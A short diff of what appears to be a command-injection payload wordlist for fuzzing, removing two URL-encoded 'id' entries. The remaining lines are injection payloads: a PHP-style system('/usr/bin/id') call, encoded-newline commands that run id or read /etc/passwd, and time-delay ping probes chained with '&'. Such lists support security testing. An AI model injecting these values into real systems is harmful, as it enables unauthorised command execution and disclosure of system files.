@@ -180,9 +180,7 @@ a|/usr/bin/id
 ;system('/usr/bin/id')
 %0Acat%20/etc/passwd
 %0A/usr/bin/id
-%0Aid
 %0A/usr/bin/id%0A
-%0Aid%0A
 & ping -i 30 127.0.0.1 &
 & ping -n 30 127.0.0.1 &
 %0a ping -i 30 127.0.0.1 %0a
